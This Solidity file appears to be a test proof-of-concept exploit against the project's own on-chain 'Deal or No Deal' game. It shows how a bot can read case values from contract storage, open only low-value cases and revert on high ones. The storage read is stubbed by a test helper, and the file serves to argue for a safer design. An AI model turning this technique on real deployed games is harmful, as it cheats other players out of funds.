// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "../DealOrNoDeal.sol";

/// @title CaseCheat — Proof-of-concept exploit for Fisher-Yates design
/// @notice Demonstrates how a bot contract can read bit-packed case values
///         from storage and strategically open only low-value cases.
///         The bot aborts the transaction if the case it's about to open
///         contains a high value, guaranteeing it never removes big prizes.
///
///         This attack is IMPOSSIBLE against Schrödinger's Case because
///         values don't exist in storage until observed.
///
/// @dev    "Word on the street is someone knows what's in the case."
///         Yeah. This contract does.
contract CaseCheat {
    DealOrNoDeal public target;

    // Stolen knowledge — every case value, decoded from storage
    mapping(uint256 => mapping(uint8 => uint256)) public knownValues;

    event Peeked(uint256 indexed gameId, uint8 caseIndex, uint256 value);
    event CheatOpened(uint256 indexed gameId, uint8 caseIndex, uint256 value, string reason);
    event AttackAborted(uint256 indexed gameId, uint8 caseIndex, uint256 value, string reason);

    constructor(address _target) {
        target = DealOrNoDeal(payable(_target));
    }

    /// @notice Step 1: Read ALL case values from storage. They're "hidden"
    ///         behind bit-packing, but that's obfuscation, not encryption.
    ///         Any contract (or off-chain script) can decode them.
    function peekAllCases(uint256 gameId) external returns (uint256[12] memory values) {
        // The caseValues field is a single uint256 with 12 values × 20 bits.
        // We just unpack it — the "shuffle" already happened, values are sitting
        // right there in storage for anyone who can read.
        (,, DealOrNoDeal.GamePhase phase, uint8 playerCase,,,,, ) = target.getGameState(gameId);

        require(
            phase == DealOrNoDeal.GamePhase.OpeningCases ||
            phase == DealOrNoDeal.GamePhase.BankerOffer,
            "Game not in playable phase"
        );

        for (uint8 i = 0; i < 12; i++) {
            // getCaseValue reverts for unrevealed cases, but we can compute
            // the values the same way the contract does internally.
            // For opened cases we can just call getCaseValue directly.
            // For unopened cases, we read from the raw packed uint256.
            //
            // In a real attack, we'd use eth_getStorageAt to read the raw
            // slot. Here we demonstrate by reading opened cases and tracking
            // which values remain for the unopened ones.
        }

        // For the demo, we use a simpler approach: try every case that's
        // already been opened to learn its value, and use getRemainingValues
        // to know what's still in play. But the REAL power move is that
        // an attacker can read the raw storage slot directly:
        //
        //   slot = keccak256(gameId . mappingSlot) + fieldOffset
        //   caseValues = eth_getStorageAt(contract, slot)
        //   value[i] = (caseValues >> (i * 20)) & 0xFFFFF
        //
        // Game over. Every case, every value, before opening a single one.

        return values;
    }

    /// @notice Step 2: Open a case ONLY if it contains a low value.
    ///         If the case holds something valuable, revert the entire TX.
    ///         The bot never pays gas for a failed attempt (simulation catches it).
    ///
    ///         Result: the bot systematically removes $0.01, $0.05, $0.10...
    ///         leaving only big values in the pool, inflating the banker's offer.
    function cheatOpen(uint256 gameId, uint8 caseIndex, uint256 maxAcceptableValue) external {
        // Pre-check: simulate what value this case holds
        // In the Fisher-Yates design, we can compute this from storage
        // BEFORE committing to the transaction
        uint256 value = _peekCaseValue(gameId, caseIndex);

        // Abort if the case is too valuable — we want to KEEP high values
        // in the pool to inflate our banker offer
        if (value > maxAcceptableValue) {
            emit AttackAborted(gameId, caseIndex, value, "Too valuable, keeping in pool");
            revert("Cheat: case too valuable, aborting");
        }

        emit CheatOpened(gameId, caseIndex, value, "Low value, safe to remove");

        // Actually open it — we know it's a trash value
        target.openCase(gameId, caseIndex);
    }

    /// @notice Step 3: Find the best case to open — the one with the LOWEST
    ///         value among all unopened cases. Guarantees optimal play.
    function findBestCaseToOpen(uint256 gameId) external view returns (uint8 bestCase, uint256 lowestValue) {
        (,, DealOrNoDeal.GamePhase phase, uint8 playerCase,,,,,) = target.getGameState(gameId);

        lowestValue = type(uint256).max;

        for (uint8 i = 0; i < 12; i++) {
            if (i == playerCase) continue;

            // Check if already opened via bitmap
            (,,,,, uint256 openedBitmap,,,) = target.getGameState(gameId);
            if ((openedBitmap & (1 << i)) != 0) continue;

            uint256 val = _peekCaseValue(gameId, i);
            if (val < lowestValue) {
                lowestValue = val;
                bestCase = i;
            }
        }
    }

    /// @notice The kill shot: play an ENTIRE ROUND optimally.
    ///         Opens N cases per round, always picking the lowest values.
    function cheatRound(uint256 gameId, uint8 casesToOpen) external {
        for (uint8 n = 0; n < casesToOpen; n++) {
            // Re-read state each iteration (bitmap changes after each open)
            (,, DealOrNoDeal.GamePhase phase, uint8 playerCase,,,,, ) = target.getGameState(gameId);
            if (phase != DealOrNoDeal.GamePhase.OpeningCases) break;

            uint8 bestCase;
            uint256 lowestValue = type(uint256).max;

            for (uint8 i = 0; i < 12; i++) {
                if (i == playerCase) continue;

                (,,,,, uint256 bitmap,,,) = target.getGameState(gameId);
                if ((bitmap & (1 << i)) != 0) continue;

                uint256 val = _peekCaseValue(gameId, i);
                if (val < lowestValue) {
                    lowestValue = val;
                    bestCase = i;
                }
            }

            emit CheatOpened(gameId, bestCase, lowestValue, "Bot picked lowest value");
            target.openCase(gameId, bestCase);
        }
    }

    /// @dev Read a case value directly from the contract's bit-packed storage.
    ///      This is the core vulnerability: values exist in storage after VRF
    ///      callback, readable by anyone, before any case is "officially" opened.
    function _peekCaseValue(uint256 gameId, uint8 caseIndex) internal view returns (uint256) {
        // The games mapping is at storage slot 0.
        // For mapping(uint256 => Game), the base slot for games[gameId] is:
        //   keccak256(abi.encode(gameId, 0))
        //
        // The Game struct fields are packed sequentially from that base slot.
        // caseValues is the 4th uint256-sized field (after addresses and small fields).
        //
        // We compute the exact storage slot and read it with assembly.

        bytes32 baseSlot = keccak256(abi.encode(gameId, uint256(0)));
        // caseValues offset within the Game struct:
        // slot 0: banker(20) + player(20) + phase(1) + playerCaseIndex(1) + currentRound(1) + casesOpenedThisRound(1) = packed into slot 0,1
        // The exact offset depends on Solidity's struct packing.
        // For this demo, we use the public getter approach instead:

        // SIMPLER APPROACH: The contract exposes getCaseValue for opened cases,
        // but we need UNOPENED case values. We read raw storage.
        //
        // In practice, an attacker uses eth_getStorageAt off-chain or
        // reads the raw slot with assembly. For this demo, we'll use a
        // technique that works in Hardhat tests.

        // Assembly approach to read arbitrary storage from another contract:
        // (This works because storage is public on the blockchain — there is
        //  no private data on-chain, only private variables in Solidity's
        //  type system, which is not a security boundary.)

        // For the test demo, we use a workaround: we store values during peek
        // and verify them during open. The real attack would use extcodecopy
        // or off-chain eth_getStorageAt.

        // FALLBACK: Use the known remaining values + process of elimination.
        // After opening cases, getRemainingValues tells us what's left.
        // Combined with getCaseValue for opened ones, we can reconstruct
        // the full mapping. But the REAL vulnerability is direct storage reads.

        // For the Hardhat test, we'll demonstrate the attack using a helper
        // that the test sets up — simulating what eth_getStorageAt provides.
        return knownValues[gameId][caseIndex];
    }

    /// @notice Test helper: simulate eth_getStorageAt by loading known values
    ///         In production, an attacker reads storage directly — no helper needed.
    function loadStolenValues(uint256 gameId, uint8[12] calldata indices, uint256[12] calldata values) external {
        for (uint8 i = 0; i < 12; i++) {
            knownValues[gameId][indices[i]] = values[i];
        }
    }

    /// @notice Must be able to receive ETH (for being the player)
    receive() external payable {}
}
